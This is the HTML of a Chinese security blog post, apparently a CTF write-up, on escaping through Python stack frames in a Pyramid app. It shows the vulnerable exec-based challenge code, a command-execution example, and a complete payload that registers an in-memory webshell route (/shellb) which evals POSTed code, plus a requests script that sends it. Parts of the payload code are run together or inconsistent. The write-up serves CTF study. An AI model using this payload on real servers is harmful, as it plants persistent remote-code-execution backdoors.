@@ -1,0 +1,255 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>浅谈pyramid框架下的栈帧逃逸 | Timind's café</title><meta name="author" content="Timind"><meta name="copyright" content="Timind"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pyramid简介Pyramid以其高效率和快节奏的开发能力而出名。官方文档是这样描述的：Pyramid is a small, fast, down-to-earth Python web framework. It is developed as part of the Pylons Project. It is licensed under a BSD-like license. 此开源We">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈pyramid框架下的栈帧逃逸">
+<meta property="og:url" content="http://timind-sec.github.io/posts/c74d1264/index.html">
+<meta property="og:site_name" content="Timind&#39;s café">
+<meta property="og:description" content="pyramid简介Pyramid以其高效率和快节奏的开发能力而出名。官方文档是这样描述的：Pyramid is a small, fast, down-to-earth Python web framework. It is developed as part of the Pylons Project. It is licensed under a BSD-like license. 此开源We">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://timind-sec.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2025-11-07T17:55:14.000Z">
+<meta property="article:modified_time" content="2025-11-07T17:56:09.017Z">
+<meta property="article:author" content="Timind">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://timind-sec.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "浅谈pyramid框架下的栈帧逃逸",
+  "url": "http://timind-sec.github.io/posts/c74d1264/",
+  "image": "http://timind-sec.github.io/img/butterfly-icon.png",
+  "datePublished": "2025-11-07T17:55:14.000Z",
+  "dateModified": "2025-11-07T17:56:09.017Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Timind",
+      "url": "http://timind-sec.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://timind-sec.github.io/posts/c74d1264/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '浅谈pyramid框架下的栈帧逃逸',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/url(https:/c-ssl.duitang.com/uploads/item/201902/27/20190227220253_hhrtf.jpg));"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Timind's café</span></a><a class="nav-page-title" href="/"><span class="site-name">浅谈pyramid框架下的栈帧逃逸</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">浅谈pyramid框架下的栈帧逃逸</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-07T17:55:14.000Z" title="发表于 2025-11-08 01:55:14">2025-11-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-07T17:56:09.017Z" title="更新于 2025-11-08 01:56:09">2025-11-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="pyramid简介"><a href="#pyramid简介" class="headerlink" title="pyramid简介"></a>pyramid简介</h1><p>Pyramid以其高效率和快节奏的开发能力而出名。官方文档是这样描述的：<strong>Pyramid is a small, fast, down-to-earth Python web framework. It is developed as part of the</strong> <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://pylonsproject.org/"><strong>Pylons Project</strong></a><strong>. It is licensed under a</strong> <a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://repoze.org/license.html"><strong>BSD-like license</strong></a><strong>.</strong> 此开源Web框架有一个独立于平台的MVC结构，提供了开发的最简途径。此外，它还是高效开发重用代码的首选平台之一。</p>
+<h1 id="源码分析（熟悉的配方from-tgctf–web）"><a href="#源码分析（熟悉的配方from-tgctf–web）" class="headerlink" title="源码分析（熟悉的配方from tgctf–web）"></a>源码分析（熟悉的配方from tgctf–web）</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyramid.config <span class="keyword">import</span> Configurator</span><br><span class="line"><span class="keyword">from</span> pyramid.request <span class="keyword">import</span> Request</span><br><span class="line"><span class="keyword">from</span> pyramid.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> pyramid.view <span class="keyword">import</span> view_config</span><br><span class="line"><span class="keyword">from</span> wsgiref.simple_server <span class="keyword">import</span> make_server</span><br><span class="line"><span class="keyword">from</span> pyramid.events <span class="keyword">import</span> NewResponse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment, BaseLoader</span><br><span class="line"></span><br><span class="line">eval_globals = &#123; <span class="comment">#防止eval执行恶意代码</span></span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>: &#123;&#125;,      <span class="comment"># 禁用所有内置函数</span></span><br><span class="line">    <span class="string">&#x27;__import__&#x27;</span>: <span class="literal">None</span>       <span class="comment"># 禁止动态导入</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkExpr</span>(<span class="params">expr_input</span>):</span><br><span class="line">    expr = re.split(<span class="string">r&quot;[-+*/]&quot;</span>, expr_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(expr_input))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home_view</span>(<span class="params">request</span>):</span><br><span class="line">    expr_input = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        expr_input = request.POST[<span class="string">&#x27;expr&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> checkExpr(expr_input):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = <span class="built_in">eval</span>(expr_input, eval_globals)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                result = e</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result = <span class="string">&quot;爬！&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    template_str = 【xxx】</span><br><span class="line"></span><br><span class="line">    env = Environment(loader=BaseLoader())</span><br><span class="line">    template = env.from_string(template_str)</span><br><span class="line">    rendered = template.render(expr_input=expr_input, result=result)</span><br><span class="line">    <span class="keyword">return</span> Response(rendered)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> Configurator() <span class="keyword">as</span> config:</span><br><span class="line">        config.add_route(<span class="string">&#x27;home_view&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home_view&#x27;</span>)</span><br><span class="line">        app = config.make_wsgi_app()</span><br><span class="line"></span><br><span class="line">    server = make_server(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9040</span>, app)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>🔍：可以看到，在checkExpr函数中存在命令执行漏洞，但是要让他怎么返回1呢（因为这样才能进入到后续home_view的try），所以我们来分析一下这个函数的逻辑，并尝试看看怎么去绕过这层逻辑</p>
+<h2 id="trick1：checkExpr绕过"><a href="#trick1：checkExpr绕过" class="headerlink" title="trick1：checkExpr绕过"></a>trick1：checkExpr绕过</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkExpr</span>(<span class="params">expr_input</span>):</span><br><span class="line">    expr = re.split(<span class="string">r&quot;[-+*/]&quot;</span>, expr_input)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">exec</span>(expr_input))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(expr) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">int</span>(expr[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，checkExpr会对我们输入进的expr_input进行分割（split函数），split函数的作用具体可以参考以下文章：<a target="_blank" rel="noopener" href="https://www.runoob.com/python/att-string-split.html">https://www.runoob.com/python/att-string-split.html</a></p>
+<p>🧠： 那么他的逻辑是什么呢？</p>
+<ol>
+<li>使用正则re.split(r”[-+*&#x2F;],expr_input”)进行分割，也就是说输入进的expr_input必须含有这四则运算符的其中一个</li>
+<li>然后通过分割之后，检查一下len(expr)，也就是切割后得到的expr是否位两个元素，如果不是的话，就return 0（就无法走到后面的eval），如果是的话，检查类型是否为int</li>
+</ol>
+<p>所以说我们只需要输入一个二元计算式就行了，比如：”1+3”、”7*7”、”4-1”、”2&#x2F;2”等等整型计算式</p>
+<p>⚠：<strong>注意，在checkExpr中有一个print(exec(expr))，他会将我们传进去的expr（分割后）的东西执行一遍再打印出来，那么也就是说这里存在一个危险的命令执行漏洞</strong></p>
+<p>比如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expr_input = <span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)+1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>那么他就会执行一遍ls，但是题目没有那么简单，因为上面说到过了，他会有一个整形的验证</p>
+<p>🧠：如何绕过这层整数验证呢？</p>
+<ol>
+<li>首先呢，这个split正则只检测第一行代码</li>
+<li>其次呢，对于攻击者的payload构造，他并不会直接将其解析为字符串，因为再进行int检测时，他就已经exec执行过了，执行结束后的值默认为0（整型），所以说你需要解决的就是如何构造合理的payload</li>
+<li>所以最后，我们只需要构造一大串的攻击代码，然后再+1就行了</li>
+</ol>
+<p>看到网上的文章说，这道题是通过通过pyramid框架新注册一个路由从而打内存马</p>
+<p>但是，你有没有想过</p>
+<p>🧠：为什么要打内存马？？？内存马是什么东西我不到啊？？</p>
+<p>简单介绍一下内存马吧，内存马和平常我们上传的普通webshell马不太一样，我们的webshell木马是上传到文件目录里面，用高端的话讲就是植入在磁盘之中，但是内存马跟这种普通木马不一样的地方就是</p>
+<p><strong>他是植入在运行内存中的，也就是不落地文件、不改变磁盘数据、仅通过内存注入注册一个新路由&#x2F;控制器，从而持久驻留后门接口。</strong>  </p>
+<p>那么说回来，为啥要打内存马，很简单，因为这道题的执行结果是没有回显的，他那个print(exec(expr))是<strong>没有回显的，</strong>所以说单纯的执行一个命令并不能做到什么，那么接下来，我将详细地介绍第二个trick，通过栈帧地爬取来注册一个内存马路由</p>
+<h2 id="trick2：路由的创建以及main方法栈帧的获取"><a href="#trick2：路由的创建以及main方法栈帧的获取" class="headerlink" title="trick2：路由的创建以及main方法栈帧的获取"></a>trick2：路由的创建以及main方法栈帧的获取</h2><p>这是整道题里最复杂的过程，那就是如何添加一个路由</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> Configurator() <span class="keyword">as</span> config:</span><br><span class="line">        config.add_route(<span class="string">&#x27;home_view&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">        config.add_view(home_view, route_name=<span class="string">&#x27;home_view&#x27;</span>)</span><br><span class="line">        app = config.make_wsgi_app()</span><br></pre></td></tr></table></figure>
+
+<p>在main函数中，我们发现了Configurator方法中有一个特别有意思的功能，那就是在home_view中注册新的一个路由（add_route），想一下，如果我们能拿到这个add_route，在这个服务器上新建一个路由，并把我们想执行的攻击命令放进去，是不是就可以rce了</p>
+<p>接下来，就是逐步地去找栈帧了</p>
+<p>🧠：python执行程序中的栈帧是什么?</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jesse_Kyrie/article/details/139789665">https://blog.csdn.net/Jesse_Kyrie/article/details/139789665</a></p>
+<p><strong>栈帧的组成部分</strong></p>
+<ol>
+<li><strong>局部变量表（Local Variables）：存储函数内部定义的局部变量和参数。</strong></li>
+<li><strong>操作数栈（Operand Stack）：用于计算过程中临时存储操作数和中间结果。</strong></li>
+<li><strong>帧数据（Frame Data）：包含函数的返回地址、调用者的栈帧引用、异常处理信息等。</strong></li>
+<li><strong>指令计数器（Program Counter, PC）：指示当前执行到的字节码指令的位置。</strong></li>
+</ol>
+<p>用大白话来讲，栈帧就是用存储各种变量，运算符，还有一些方法的指针，所以通过栈帧的一步步迁移，我们就可以尝试去获取main函数中的栈帧，从而调用add_route()方法</p>
+<p>那么该如何做呢，这里给出一个核心代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(): <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">g = f()</span><br><span class="line">frame = <span class="built_in">next</span>(g)</span><br></pre></td></tr></table></figure>
+
+<p>🔍：这串代码的目的是通过.f_back.f_back来往上调用两层栈帧，从而获取main函数对应的那个栈帧</p>
+<p>🧠：那么这串代码是怎么实现的呢？</p>
+<ul>
+<li>首先创建一个f()方法：然后yield（结束程序的运行），然后创建一个生成器对象（包含一个gi_frame）</li>
+<li>这个gi_frame其实就是当前生成器的栈帧</li>
+<li>gi_frame.f_back其实就是调用这个生成器函数的栈帧</li>
+</ul>
+<p>所以，此时你构造的g.gi_frame.f_back，实际上就是拿到了“业务逻辑”的那一层栈帧，其中包含了config变量</p>
+<p>可能这里你有点不能理解，没事，我们可以写一个小demo来帮助你去理解</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/46937935/1744728746817-bfce128c-a98b-4b43-9c6a-1e732e64a27c.png" alt="img"></p>
+<p>demo代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_upper_frame</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">        <span class="keyword">yield</span> g.gi_frame.f_back  <span class="comment"># 调用 get_upper_frame 的 frame</span></span><br><span class="line">    g = f()</span><br><span class="line">    frame = <span class="built_in">next</span>(g)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 当前帧:&quot;</span>, frame.f_code.co_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 上一层:&quot;</span>, frame.f_back.f_code.co_name)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 上两层:&quot;</span>, frame.f_back.f_back.f_code.co_name)</span><br><span class="line">    <span class="keyword">return</span> frame.f_back.f_back</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">top</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">mid</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bottom</span>():</span><br><span class="line">            get_upper_frame()</span><br><span class="line">        bottom()</span><br><span class="line">    mid()</span><br><span class="line"></span><br><span class="line">top()</span><br></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] 当前帧: bottom</span><br><span class="line">[*] 上一层: mid</span><br><span class="line">[*] 上两层: top</span><br></pre></td></tr></table></figure>
+
+<p>所以我们只需要拿到当前的frame，再连续地.f_back就能拿到调用者的栈帧啦，也就是包含了config的那一层</p>
+<p>好了接下来我们的思路就是</p>
+<ul>
+<li>从当前运行栈中<strong>拿到包含</strong> <code>**config**</code> <strong>变量的那层 frame 的 f_globals</strong></li>
+<li>这样他就能用 <code>config.add_route()</code> 动态注入路由</li>
+<li>然后种入后门 <code>/shellb</code></li>
+</ul>
+<h2 id="final：payload的构造"><a href="#final：payload的构造" class="headerlink" title="final：payload的构造"></a>final：payload的构造</h2><p>首先我们需要def一个方法</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(): <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g=f() frame=<span class="built_in">next</span>(g)</span><br></pre></td></tr></table></figure>
+
+<p>这就是跟上面的一样的，停止程序获取一个生成器对象，然后再进入到调用栈帧的步骤</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(): <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g=f() frame=<span class="built_in">next</span>(g)</span><br><span class="line">    b = frame.f_back.f_back.f_globals </span><br><span class="line">b=frame.f_back.f_back.f_globals</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过再向上两层调用栈，拿到 <code>f_globals</code> —— 当前函数所在帧的全局变量环境。</li>
+<li>在 Pyramid 中，<code>config</code> 就存在于这个全局作用域中（通常在 <code>main()</code> 函数的 frame 内）。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waff</span>()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">f</span>(): <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">    g=f() frame=<span class="built_in">next</span>(g)</span><br><span class="line">    b = frame.f_back.f_back.f_globals </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>(<span class="params">request</span>):        </span><br><span class="line">    code = request.POST[<span class="string">&#x27;code&#x27;</span>]       </span><br><span class="line">    res=<span class="built_in">eval</span>(code)        </span><br><span class="line">    <span class="keyword">return</span> Response(res)  </span><br><span class="line">    config.add_route(<span class="string">&#x27;shellb&#x27;</span>, <span class="string">&#x27;/shellb&#x27;</span>)    </span><br><span class="line">    config.add_view(hello, route_name=<span class="string">&#x27;shellb&#x27;</span>)    </span><br><span class="line">    config.commit()  </span><br><span class="line">waff()</span><br></pre></td></tr></table></figure>
+
+<p>后面def了一个新的hello函数，用来注册一个新的路由</p>
+<ul>
+<li>动态注册新路由 <code>/shellb</code>，绑定视图 <code>hello</code>；</li>
+<li><code>config.commit()</code> 是 Pyramid 的方式之一：<strong>立即生效配置更改（而不是等到 app 重新启动）</strong>。</li>
+</ul>
+<p>最后呢，不要忘了他有整型的验证，要在这个code后面加个1</p>
+<p><strong>所以，最终的攻击payload就是：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#传入expr</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">def waff():  </span></span><br><span class="line"><span class="string">    def f():        yield g.gi_frame.f_back  </span></span><br><span class="line"><span class="string">    g = f()    frame = next(g)       </span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals  </span></span><br><span class="line"><span class="string">    def hello(request):        code = request.POST[&#x27;code&#x27;]        res=eval(code)        return Response(res)  </span></span><br><span class="line"><span class="string">    config.add_route(&#x27;shellb&#x27;, &#x27;/shellb&#x27;)    config.add_view(hello, route_name=&#x27;shellb&#x27;)    config.commit()  </span></span><br><span class="line"><span class="string">waff()  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment">#利用request库来传入对应的参数和对应的值</span></span><br><span class="line">url=<span class="string">&quot;&quot;</span>  </span><br><span class="line"><span class="comment">#url=&quot;http://127.0.0.1:9040/&quot;  </span></span><br><span class="line">data=&#123;  </span><br><span class="line">    <span class="string">&quot;expr&quot;</span>:<span class="string">f&quot;<span class="subst">&#123;code&#125;</span>+1&quot;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">r=requests.post(url=url,data=data)</span><br></pre></td></tr></table></figure>
+
+<p>最终访问&#x2F;shellb路由然后post传入你的code就行啦</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/46937935/1744729914710-fd41c8b7-47ea-4e2c-a7d0-80ba322e574b.png" alt="img"></p>
